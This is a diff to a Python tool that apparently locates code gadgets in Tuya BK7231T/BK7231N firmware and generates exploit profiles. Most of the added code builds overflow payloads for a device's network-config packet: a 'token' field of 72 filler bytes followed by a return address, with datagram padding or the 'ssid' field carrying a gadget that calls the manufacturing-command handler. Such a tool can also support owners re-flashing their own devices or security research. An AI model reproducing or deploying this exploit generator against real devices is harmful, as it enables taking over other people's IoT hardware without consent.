@@ -2,6 +2,11 @@ import bisect
 import itertools
 import struct
 import sys
+import base64
+import json
+import zlib
+import socket
+
 from collections import deque, namedtuple
 from typing import Callable, List
 
@@ -10,6 +15,44 @@ from capstone import *
 
 CodePatternMatch = namedtuple("CodePatternMatch", "matched_instructions start_address start_offset")
 SentinelInstruction = namedtuple("SentinelInstruction", "address size")
+
+class ProfileBuilder(object):
+    MAX_CONFIG_PACKET_PAYLOAD_LEN = 0xE8
+    AUTHKEY_TEMPLATE = 'AUTHKEYAAAAAAAAA'
+    UUID_TEMPLATE = 'UUIDAAAAAAAA'
+    
+    def build_network_config_packet(self, payload):
+        if len(payload) > self.MAX_CONFIG_PACKET_PAYLOAD_LEN:
+            raise ValueError('Payload is too long!')
+        # NOTE
+        # fr_num and crc do not seem to be used in the disas
+        # calculating them anyway - in case it's needed
+        # for some reason.
+        tail_len = 8
+        head, tail = 0x55aa, 0xaa55
+        fr_num, fr_type = 0, 0x1
+        plen = len(payload) + tail_len
+        buffer = struct.pack("!IIII", head, fr_num, fr_type, plen)
+        buffer += payload
+        crc = zlib.crc32(buffer)
+        buffer += struct.pack("!II", crc, tail)
+        return buffer
+
+    def encode_json_val(self, value):
+        encoded = []
+        escaped = list(map(ord, '"\\'))
+        escape_char = ord('\\')
+        for i in value:
+            if i in escaped:
+                encoded.append(escape_char)
+            encoded.append(i)
+        return bytes(encoded)
+
+    def check_valid_payload(self, value):
+        eq_zero = lambda x: x == 0
+        if any(map(eq_zero, value)):
+            raise RuntimeError('[!] At least one null byte detected in payload. Clobbering will stop before that.')
+        return value
 
 class CodePatternFinder(object):
     def __init__(self, code: bytes, base_address: int = 0):
@@ -57,7 +100,8 @@ class CodePatternFinder(object):
         return matches
 
     def bytecode_search(self, bytecode: bytes, stop_at_first: bool = True):
-        offset = self.code.index(bytecode, 0)
+        offset = self.code.find(bytecode, 0)
+
         if offset == -1:
             return []
 
@@ -65,12 +109,17 @@ class CodePatternFinder(object):
         if stop_at_first:
             return matches
 
-        offset = self.code.index(bytecode, offset+1)
+        offset = self.code.find(bytecode, offset+1)
         while offset != -1:
             matches.append(self.base_address + offset)
-            offset = self.code.index(bytecode, offset+1)
+            offset = self.code.find(bytecode, offset+1)
 
         return matches
+
+    def set_final_thumb_offset(self, address):
+        # Because we're only scanning the app partition, we must add the offset for the bootloader
+        # Also add an offset of 1 for the THUMB
+        return address + 0x10000 + 1
 
     def __build_cache(self, thumb_mode: bool):
         mode = CS_MODE_THUMB if thumb_mode else CS_MODE_ARM
@@ -100,137 +149,138 @@ class CodePatternFinder(object):
         return 2 if thumb_mode else 4
 
 def walk_app_code(appcode: bytes):
-    # TODO: maybe match here already on strings in the binary?
-    if b'wifisdk_for_bk7231/project' in appcode:
-        pass # 970715 - older sdk
-    elif b'EmbedSDKs/ty_iot_wf_bt_sdk_bk' in appcode:
-        pass # newer sdk
-    elif b'udp_ap_v3' in appcode:
-        pass # CB3S / BK7231N stuff
-    else:
-        raise RuntimeError('Unknown appcode provided')
+    # Older versions of BK7231T, BS version 30.0x, SDK 2.0.0
+    if b'BY tuya_iot_team AT 8710_2M' in appcode:
+        # 2b 68 30 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
+        # 1 match should be found
+        # 04 1e 07 d1 11 9b 21 1c 00 is the byte pattern for mf_cmd_process execution
+        # 3 matches, 2nd is correct
+        process_generic("BK7231T", 1, 1, "2b68301c9847", 1, 0, "041e07d1119b211c00", 3, 1)
+        return
 
-    APPCODE_START_ADDRESS = 0x10000
-    print("[!] Loading and disassembling code - may take a moment")
-    matcher = CodePatternFinder(appcode, APPCODE_START_ADDRESS)
-    print("[+] Code loaded!")
+    # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
+    if b'BY embed FOR ty_iot_wf_bt_sdk_bk AT bk7231t' in appcode:
+        # 23 68 38 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
+        # 2 matches should be found, 1st is correct
+        # a1 4f 06 1e is the byte pattern for mf_cmd_process execution
+        # 1 match should be found
+        process_generic("BK7231T", 2, 1, "2368381c9847", 2, 0, "a14f061e", 1, 0)
+        return
 
-    print("[!] Searching for post-vuln code patterns")
+    # Strange apparently 1-off version with a BK7231N SDK adapted to BK7231T, BS 40.00, SDK 2.3.2
+    if b'BY embed FOR ty_iot_sdk AT bk7231t' in appcode:
+        # TODO: Figure out how to process this format
+        raise RuntimeError("This device uses an unusual SDK and there is currently no pattern to mach it.")
+        #process_generic("BK7231T", 3, 1/2, "", 0, 0, "", 0, 0) # Uknown if payload_version is 1 or 2, more likely 2
+        return
 
-    # Works for the BK7231N and the newer sdk stuff
-    post_vuln_pattern = [
-        lambda i0, _: i0.id == arm.ARM_INS_ADD and i0.operands[1].imm == 0xfc,
-        lambda i1, _: i1.id == arm.ARM_INS_LDR and i1.operands[0].reg == arm.ARM_REG_R3 and len(i1.operands) > 1 and i1.operands[1].mem.disp == 0x50,
-        lambda i2, _: i2.id in [arm.ARM_INS_LDR, arm.ARM_INS_ADD, arm.ARM_INS_SUB] and i2.operands[0].reg in [arm.ARM_REG_R0, arm.ARM_REG_R1],
-        lambda i3, _: i3.id in [arm.ARM_INS_LDR, arm.ARM_INS_ADD, arm.ARM_INS_SUB] and i3.operands[0].reg in [arm.ARM_REG_R0, arm.ARM_REG_R1],
-    ]
+    # Older (relatively, at least it existed first from sample data) version of BK7231N, BS 40.00, SDK 2.3.1
+    if b'embed FOR ty_iot_sdk AT bk7231n' in appcode:
+        # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
+        # 1 match should be found
+        # 05 1e 00 d1 15 e7 is the byte pattern for mf_cmd_process execution
+        # 1 match should be found
+        process_generic("BK7231N", 1, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
+        return
 
-    match = matcher.search(condition_lambdas=post_vuln_pattern, thumb_mode=True, stop_at_first=False)
-    if not match:
-        raise RuntimeError("No matching post-vuln code patterns found")
+    # Newer (relatively, first build is after the "older" sdk) version of BK7231N, BS 40.00, SDK 2.3.1
+    if b'FOR ty_iot_sdk_bk7231n AT bk7231n' in appcode:
+        # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
+        # 1 match should be found
+        # 05 1e 00 d1 15 e7 is the byte pattern for mf_cmd_process execution
+        # 1 match should be found
+        process_generic("BK7231N", 2, 2, "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
+        return
 
-    if len(match) > 1:
-        raise RuntimeError("More than one post-vuln code pattern found. Unable to continue")
+    # Newest version of N, BS 40.00, SDK 2.3.3
+    if b'ci_manage FOR ty_iot_sdk AT bk7231n' in appcode:
+        # 43 68 20 1c 98 47 is the byte pattern for ty_cJSON_Parse entry
+        # 1 match should be found
+        # 05 1e 00 d1 fc e6 is the byte pattern for mf_cmd_process execution
+        # 1 match should be found
+        process_generic("BK7231N", 3, 2, "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
+        return
 
+    raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')
 
-    match = match[0]
-    print("[+] Found a post-vuln code pattern match!")
-    print("[+] Matched instructions: ")
+def process_generic(chipset, pattern_version, payload_version, ty_json_parse_string, ty_json_parse_count, ty_json_parse_index, mf_cmd_process_string, mf_cmd_process_count, mf_cmd_process_index):
+    print(f"[!] Matched pattern for {chipset} version {pattern_version}, payload version {payload_version}")
+    print("[!] Searching for ty_cJSON_Parse")
+    matcher = CodePatternFinder(appcode, 0x0)
 
-    for mi in match.matched_instructions:
-        print(f"\t{mi.address:#x}: {mi.mnemonic} {mi.op_str}")
-        if mi.id == arm.ARM_INS_LDR and mi.operands[0].reg == arm.ARM_REG_R3:
-            ldr_r3 = mi
-
-    lan_obj_reg = ldr_r3.operands[1].reg
-
-    print(f"[+] Identified lan object register as {ldr_r3.reg_name(lan_obj_reg)}")
-    print(f"[!] Searching for JSON object register")
-
-    json_delete_pattern = [
-        lambda i0, _: i0.id in [arm.ARM_INS_SUB, arm.ARM_INS_ADD] and len(i0.operands) > 2 and i0.operands[0].reg == arm.ARM_REG_R0 and i0.operands[2].imm == 0,
-        lambda i1, _: i1.id == arm.ARM_INS_BL
-    ]
-
-    json_delete_start_address = match.matched_instructions[-1].address - 2
-    json_delete_matches = matcher.search(condition_lambdas=json_delete_pattern, start_address=json_delete_start_address, thumb_mode=True, stop_at_first=True)
-    if not json_delete_matches:
-        raise RuntimeError("Failed to find a reference to the JSON object register - no code matches")
-
-    adds_r0_json_obj = json_delete_matches[0].matched_instructions[0]
-    if abs(adds_r0_json_obj.address - json_delete_start_address) >= 10:
-        raise RuntimeError(f"Failed to find a reference to the JSON object register - first code match address {adds_r0_json_obj.address:#x} is too far away from post-vuln invocation")
-
-    json_obj_reg = adds_r0_json_obj.operands[1].reg
-    json_obj_reg_name = adds_r0_json_obj.reg_name(json_obj_reg)
-    print(f"[+] Identified JSON object register as {json_obj_reg_name}")
-
-    print("[!] Searching for ty_cJSON_Parse function address")
-    ty_cjson_parse_code = bytes.fromhex("002108b50a1cfff7cbff08bd")
-    ty_cjson_parse_matches = matcher.bytecode_search(ty_cjson_parse_code, stop_at_first=True)
-    if not ty_cjson_parse_matches:
+    ty_cjson_parse_code = bytes.fromhex(ty_json_parse_string)
+    ty_cjson_parse_matches = matcher.bytecode_search(ty_cjson_parse_code, stop_at_first=False)
+    
+    if not ty_cjson_parse_matches or len(ty_cjson_parse_matches) > ty_json_parse_count:
         raise RuntimeError("Failed to find ty_cJSON_Parse")
-
-    ty_cjson_parse_addr = ty_cjson_parse_matches[0]
-    print(f"[+] ty_cJSON_Parse address: {ty_cjson_parse_addr:#x}")
-
-    cjson_parse_invoke_pattern = [
-        lambda i0, _: i0.id == arm.ARM_INS_BL and i0.operands[0].imm == ty_cjson_parse_addr
-    ]
-
-    cjson_parse_invocations = matcher.search(condition_lambdas=cjson_parse_invoke_pattern, stop_at_first=False, after_match_count=1)
-    if not cjson_parse_invocations:
-        raise RuntimeError("Failed to find any ty_cJSON_Parse invocations")
-
-    print("[!] Searching for mf_cmd_process gadget address")
-
-    mf_cmd_gadget_addr = None
-    # These tests fail for the BK7231N stuff
-    # which seems to not have any debugging strings
-    # maybe another pattern is more useful - say match on the loop construct
-    # if the branch is taken & json object is not null
-    for invocation in cjson_parse_invocations:
-        ldr_inst = invocation.matched_instructions[-1]
-        if ldr_inst.id == arm.ARM_INS_LDR and ldr_inst.operands[1].reg == arm.ARM_REG_PC:
-            loaded_offset = (ldr_inst.operands[1].mem.disp + ldr_inst.address + 4) - APPCODE_START_ADDRESS
-            if loaded_offset > 0 and loaded_offset < len(appcode):
-                loaded_offset = struct.unpack("<I", appcode[loaded_offset:loaded_offset+4])[0] - APPCODE_START_ADDRESS
-                if loaded_offset > 0 and loaded_offset < len(appcode):
-                    first_nullbyte = appcode.index(b'\x00', loaded_offset)
-                    try:
-                        decoded = appcode[loaded_offset:first_nullbyte].decode('utf-8')
-                        if 'mf_test.c' in decoded:
-                            mf_cmd_gadget_addr = ldr_inst.address + 1
-                            break
-                    except UnicodeError:
-                        pass
     
-    if mf_cmd_gadget_addr is None:
-        raise RuntimeError("Failed to find the mf_cmd_process gadget address")
+    ty_cjson_parse_addr = matcher.set_final_thumb_offset(ty_cjson_parse_matches[ty_json_parse_index])
+    print(f"[+] Payload prep gadget (THUMB): {ty_cjson_parse_addr:#x}")
+    print("[!] Searching for mf_cmd_process")    
 
-    print(f"[+] mf_cmd_process gadget address (THUMB): {mf_cmd_gadget_addr:#x}")
-
-    print(f"[!] Searching for a mov r0, {json_obj_reg_name} intermediate gadget")
+    mf_cmd_process_code = bytes.fromhex(mf_cmd_process_string)
+    mf_cmd_process_matches = matcher.bytecode_search(mf_cmd_process_code, stop_at_first=False)
     
+    if not mf_cmd_process_matches or len(mf_cmd_process_matches) != mf_cmd_process_count:
+        raise RuntimeError(f"Failed to find mf_cmd_process (found {len(mf_cmd_process_matches)}, expected {mf_cmd_process_count})")
 
-    fixup_gadget_pattern = [
-        lambda i0, _: i0.id == arm.ARM_INS_LDR and i0.operands[0].reg == arm.ARM_REG_R3 and i0.operands[1].reg == lan_obj_reg and i0.operands[1].mem.disp == 0 and i0.operands[1].mem.index == 0,
-        lambda i1, _: i1.id in [arm.ARM_INS_SUB, arm.ARM_INS_ADD] and len(i1.operands) > 2 and i1.operands[0].reg == arm.ARM_REG_R0 and i1.operands[1].reg == json_obj_reg and i1.operands[2].imm == 0,
-        lambda i2, _: i2.id == arm.ARM_INS_BLX and i2.operands[0].reg == arm.ARM_REG_R3
-    ]
+    mf_cmd_process_addr = matcher.set_final_thumb_offset(mf_cmd_process_matches[mf_cmd_process_index])
+    print(f"[+] Payload pwn gadget (THUMB): {mf_cmd_process_addr:#x}")
+    
+    if payload_version == 1:
+        make_profile_format1(chipset, ty_cjson_parse_addr, mf_cmd_process_addr)
+        return
+    elif payload_version == 2:
+        make_profile_format2(chipset, ty_cjson_parse_addr, mf_cmd_process_addr)
+        return
+        
+    raise RuntimeError("Unknown chipset, unable to generate profile, please open a new issue and include the bin.")
 
-    fixup_matches = matcher.search(condition_lambdas=fixup_gadget_pattern, thumb_mode=True, stop_at_first=True)
-    if not fixup_matches:
-        raise RuntimeError("Could not find a valid intermediate gadget")
+# Used by nearly all BK7231T devices
+def make_profile_format1(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
+    profile_builder = ProfileBuilder()
+    prep_gadget = ty_cjson_parse_addr.to_bytes(3, byteorder="little")
+    pwn_gadget = mf_cmd_process_addr.to_bytes(4, byteorder="little")
 
-    intermediate_gadget = fixup_matches[0]
-    print(f"[+] Found usable intermediate gadget at address {intermediate_gadget.start_address:#x}:")
-    for mi in intermediate_gadget.matched_instructions:
-        print(f"\t{mi.address:#x}: {mi.mnemonic} {mi.op_str}")
+    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"A","token":"' + b'A' * 72 + prep_gadget + b'"}'
+    payload = profile_builder.check_valid_payload(payload)
 
-    intermediate_gadget_addr = intermediate_gadget.start_address + 1
+    datagram = profile_builder.build_network_config_packet(payload=payload)
+    datagram_padding = b'A' * (4 - (len(datagram) % 4))
+    datagram_padding += pwn_gadget * ((256-len(datagram+datagram_padding))//4)
 
-    print(f"[+] Payload gadgets (THUMB): {intermediate_gadget_addr=:#x} {mf_cmd_gadget_addr=:#x}")
+    data = {
+        'chip': f'{chipset}',
+        'payload': base64.b64encode(payload).decode('utf-8'),
+        'authkey_template': f'{profile_builder.AUTHKEY_TEMPLATE}',
+        'uuid_template': f'{profile_builder.UUID_TEMPLATE}',
+        'datagram_padding': base64.b64encode(datagram_padding).decode('utf-8')
+    }
+
+    print("[+] Profile:")
+    print(json.dumps(data, indent=4))
+    
+# Used by nearly all BK7231N devices
+def make_profile_format2(chipset, ty_cjson_parse_addr, mf_cmd_process_addr):
+    profile_builder = ProfileBuilder()
+    prep_gadget = ty_cjson_parse_addr.to_bytes(3, byteorder="little")
+    pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
+    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"AAAA' + pwn_gadget + b'","token":"' + b'A' * 72 + prep_gadget + b'"}'
+    payload = profile_builder.check_valid_payload(payload)
+
+    datagram = profile_builder.build_network_config_packet(payload=payload)
+    datagram_padding = b'A' * (256-len(datagram))
+
+    data = {
+        'chip': f'{chipset}',
+        'payload': base64.b64encode(payload).decode('utf-8'),
+        'authkey_template': f'{profile_builder.AUTHKEY_TEMPLATE}',
+        'uuid_template': f'{profile_builder.UUID_TEMPLATE}',
+        'datagram_padding': base64.b64encode(datagram_padding).decode('utf-8')
+    }
+
+    print("[+] Profile:")
+    print(json.dumps(data, indent=4))
 
 if __name__ == '__main__':
     if not sys.argv[1:]:
